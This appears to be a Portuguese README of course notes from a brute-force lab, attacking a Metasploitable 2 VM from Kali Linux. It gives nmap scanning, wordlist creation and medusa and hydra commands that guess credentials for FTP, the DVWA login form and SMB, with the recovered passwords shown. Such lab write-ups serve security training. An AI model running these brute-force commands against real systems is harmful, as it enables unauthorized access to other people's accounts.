
# Curso de Brute Force da DIO

Esse documento detalha o passo a passo de cada um dos assuntos abordados no curso de brute force da DIO.

### Sistemas Utilizados
Durante o curso foram utilizadas duas VMs (Maquinas Virtuais). Uma rodando o Kali Linux e outra rodando o Metasploitable.

 - [Kali Linux 2025.3](https://www.kali.org/get-kali/#kali-installer-images)
 - [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)


### Ferramentas utilizadas

- nmap
- medusa
- hydra
- enum4linux


## Passo a Passo

### Analisando o alvo
Executando o comando "nmap" para verificar os serviços disponiveis:
```bash
nmap -sV -p 21,22,80,445,139 <IP_Address>
```
OUTPUT:
```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

### Acessando o FTP
Criando arquivos com usuario e senhas:
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwert\nmsfadmin" > passwords.txt
```
Executando o comando "medusa" para atacar o serviço FTP:
```bash
medusa -h <IP_Address> -U users.txt -P passwords.txt -M ftp -t 6
```
OUTPUT:
```bash
User: msfadmin Password: msfadmin [SUCCESS]
```

### Acessando o site DVWA através do formulário
Durante o curso a ferramenta medusa foi utilizada nessa etapa, mas por curiosidade tentei a ferramenta "hydra" para chegar ao mesmo resultado.  
  
  
Executando o comando "hydra" para atacar o form de login no site DVWA:
```bash
hydra -L users.txt -P passwords.txt <IP_Address> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -vV -t 3 -f
```
OUTPUT:
```bash
login: admin   password: password
```

### Acessando o Samba
Fazendo a enumeração do alvo:
```bash
enum4linux -a <IP_Address> | tee enum4linux_output.txt
```
Criando arquivos com usuario e senhas:
```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "123456\npassword\nWelcome123\nmsfadmin" > smb_passwords.txt
```
Executando o comando "medusa" para realizar o ataque:
```bash
medusa -h <IP_Address> -U smb_users.txt -P smb_passwords.txt -M smbnt -t 2 -T 50
```
OUTPUT:
```bash
User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```
